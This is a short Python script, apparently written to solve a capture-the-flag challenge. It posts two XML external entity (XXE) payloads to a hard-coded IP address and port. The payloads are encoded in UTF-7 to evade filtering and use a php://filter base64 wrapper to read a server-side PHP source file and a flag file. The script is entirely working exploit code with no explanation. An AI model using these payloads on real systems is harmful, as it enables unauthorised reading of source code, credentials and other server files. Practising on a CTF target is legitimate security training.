import requests
url = "http://43.248.97.213:40321/"

payload1 = """<?xml version="1.0" encoding = "utf-7"?>
+ADwAIQ-DOCTYPE a +AFs							  
	+ADwAIQ-ENTITY b SYSTEM +ACI-php://filter/read+AD0-convert.base64-encode/resource+AD0-file:///var/www/html/seCr3t.php+ACI +AD4
+AF0APg
+ADw-x+AD4AJg-b+ADsAPA-/x+AD4-
"""

r1 = requests.post(url ,data=payload1)
print(r1.text)

payload2 = """<?xml version="1.0" encoding = "utf-7"?>
+ADwAIQ-DOCTYPE a +AFs							  
	+ADwAIQ-ENTITY b SYSTEM +ACI-php://filter/read+AD0-convert.base64-encode/resource+AD0-file:///FLAGflag114514+ACI +AD4
+AF0APg
+ADw-x+AD4AJg-b+ADsAPA-/x+AD4-
"""

r2 = requests.post(url ,data=payload2)
print(r2.text)